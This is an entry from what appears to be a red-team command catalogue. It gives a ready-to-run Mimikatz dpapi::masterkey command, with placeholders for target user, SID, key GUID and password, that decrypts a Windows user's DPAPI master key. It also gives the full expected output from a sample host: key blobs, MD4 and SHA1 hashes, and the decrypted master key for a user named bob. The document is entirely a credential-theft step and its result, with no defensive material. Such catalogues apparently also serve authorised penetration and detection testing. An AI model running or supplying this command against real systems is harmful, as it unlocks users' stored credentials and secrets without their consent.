---
id: b8a26dbc-d03d-4125-bc12-14755c949b98
name: Mimikatz Extract a User's Masterkey using their Password
type: command
executor: command_prompt
data: 'mimikatz.exe

  dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID"
  /password:$_PASSWORD /protected'
output: "C:\\Windows\\system32\\spool\\drivers\\color>mimikatz.exe\n\n  .#####.  \
  \ mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59\n .## ^ ##.  \"A La Vie, A L'Amour\"\
  \ - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com\
  \ )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent\
  \ LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\n\n\nmimikatz # dpapi::masterkey /in:\"C:\\\
  Users\\bob\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1576920733-1301476157-954876328-1108\\\
  84dcc2cc-82c6-44d4-9404-45fd48b4b650\" /password:Passw0rd /protected\n**MASTERKEYS**\n\
  \  dwVersion          : 00000002 - 2\n  szGuid             : {84dcc2cc-82c6-44d4-9404-45fd48b4b650}\n\
  \  dwFlags            : 00000000 - 0\n  dwMasterKeyLen     : 00000088 - 136\n  dwBackupKeyLen\
  \     : 00000068 - 104\n  dwCredHistLen      : 00000000 - 0\n  dwDomainKeyLen  \
  \   : 00000174 - 372\n[masterkey]\n  **MASTERKEY**\n    dwVersion        : 00000002\
  \ - 2\n    salt             : 20c39edbe34bd2b5c3367ac25b2c5135\n    rounds     \
  \      : 00004650 - 18000\n    algHash          : 00008009 - 32777 (CALG_HMAC)\n\
  \    algCrypt         : 00006603 - 26115 (CALG_3DES)\n    pbKey            : b261bb57fdf57581e5a5030178e2cf83ffb6454dc542b820f69ea17e7e07984d8c8ecc70fb609014d7d1892a1fc3a98e78e034735222cb35d97d5f3f570d979a7233d889faade89e06825302eb4727a99a62f3877347834ef8e7b4de45d14f600724ed5fab09e9c2\n\
  \n[backupkey]\n  **MASTERKEY**\n    dwVersion        : 00000002 - 2\n    salt  \
  \           : 160f5fed6da3e28f44d31fca1bd24a27\n    rounds           : 00004650\
  \ - 18000\n    algHash          : 00008009 - 32777 (CALG_HMAC)\n    algCrypt   \
  \      : 00006603 - 26115 (CALG_3DES)\n    pbKey            : 1c12369cbf02f244375760823d02b2f3f16b58392e9b01e583ea2ae2b6d55f09db3504b6824e5a2fa8504b5f7d5003fa07eba1211d05430668258a6734bee77da67ac516e9ed3e07\n\
  \n[domainkey]\n  **DOMAINKEY**\n    dwVersion        : 00000002 - 2\n    dwSecretLen\
  \      : 00000100 - 256\n    dwAccesscheckLen : 00000058 - 88\n    guidMasterKey\
  \    : {bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2}\n    pbSecret         : e4ef7feea839ca86b33d5c1b7abbbc9fddc59553706715e079c10aeb0dd6ba03d2287e6f1d7b566171b31ba67d290cf8f2e46f152de6b7d98fc77e6295e22ad330ddef6755db9755cb232e2d544a91ab365a891ca4ec3d6a812a340a8b0c52a71af1dafb915ee091c12f7cd823c3b7eed0e786032d3528e6343020c91c4cbf95fc0a23ff4cef70f6950bc157d1b62938251fd3bb625c74c1b89a59565453d530d8c1f9a492535da07896c09bc7ffad27b76b42770d81317f93118732ed6b6058f942a58cfb5c8afc757a10a3e7f4295ac3388cc7fd20c57ae97431d95daa074e59f314e6a98d170c58480ba8a10d613d7c746ddd13c7cd4093d9bae5c65c557b\n\
  \    pbAccesscheck    : c7725bc1e39f008edbe46d70baa332409bea33e6fc29afe19ca9a5fe681b5cdf7be2cfa5b4e83ec086278174d990aefef39b0add0a24c35a0a58ac8f45c5d0256e7d7cd018da5550f0a3b26f1de8713d06f67988dc49f78f\n\
  \n\nAuto SID from path seems to be: S-1-5-21-1576920733-1301476157-954876328-1108\n\
  \n[masterkey] with volatile cache: SID:S-1-5-21-1576920733-1301476157-954876328-1108;;MD4:a87f3a337d73085c45f9416be5787d86;SHA1:34957e9ba3455a4a99d722b48693ac1123ba5dba;\n\
  \n[masterkey] with password: Passw0rd (protected user)\n  key : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723\n\
  \  sha1: e49b3e446435a04d0396293e6dcae8df3274e323"
created_at: '2020-07-21T05:42:41.810138+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Extract a User's Masterkey using their Password

```command_prompt
mimikatz.exe
dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /password:$_PASSWORD /protected
```

## Expected Output

```
C:\Windows\system32\spool\drivers\color>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::masterkey /in:"C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-1576920733-1301476157-954876328-1108\84dcc2cc-82c6-44d4-9404-45fd48b4b650" /password:Passw0rd /protected
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {84dcc2cc-82c6-44d4-9404-45fd48b4b650}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 20c39edbe34bd2b5c3367ac25b2c5135
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : b261bb57fdf57581e5a5030178e2cf83ffb6454dc542b820f69ea17e7e07984d8c8ecc70fb609014d7d1892a1fc3a98e78e034735222cb35d97d5f3f570d979a7233d889faade89e06825302eb4727a99a62f3877347834ef8e7b4de45d14f600724ed5fab09e9c2

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 160f5fed6da3e28f44d31fca1bd24a27
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1c12369cbf02f244375760823d02b2f3f16b58392e9b01e583ea2ae2b6d55f09db3504b6824e5a2fa8504b5f7d5003fa07eba1211d05430668258a6734bee77da67ac516e9ed3e07

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {bf2e48b9-a91f-43bf-9771-c0e9c77f7dd2}
    pbSecret         : e4ef7feea839ca86b33d5c1b7abbbc9fddc59553706715e079c10aeb0dd6ba03d2287e6f1d7b566171b31ba67d290cf8f2e46f152de6b7d98fc77e6295e22ad330ddef6755db9755cb232e2d544a91ab365a891ca4ec3d6a812a340a8b0c52a71af1dafb915ee091c12f7cd823c3b7eed0e786032d3528e6343020c91c4cbf95fc0a23ff4cef70f6950bc157d1b62938251fd3bb625c74c1b89a59565453d530d8c1f9a492535da07896c09bc7ffad27b76b42770d81317f93118732ed6b6058f942a58cfb5c8afc757a10a3e7f4295ac3388cc7fd20c57ae97431d95daa074e59f314e6a98d170c58480ba8a10d613d7c746ddd13c7cd4093d9bae5c65c557b
    pbAccesscheck    : c7725bc1e39f008edbe46d70baa332409bea33e6fc29afe19ca9a5fe681b5cdf7be2cfa5b4e83ec086278174d990aefef39b0add0a24c35a0a58ac8f45c5d0256e7d7cd018da5550f0a3b26f1de8713d06f67988dc49f78f

Auto SID from path seems to be: S-1-5-21-1576920733-1301476157-954876328-1108

[masterkey] with volatile cache: SID:S-1-5-21-1576920733-1301476157-954876328-1108;;MD4:a87f3a337d73085c45f9416be5787d86;SHA1:34957e9ba3455a4a99d722b48693ac1123ba5dba;

[masterkey] with password: Passw0rd (protected user)
  key : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
  sha1: e49b3e446435a04d0396293e6dcae8df3274e323
```
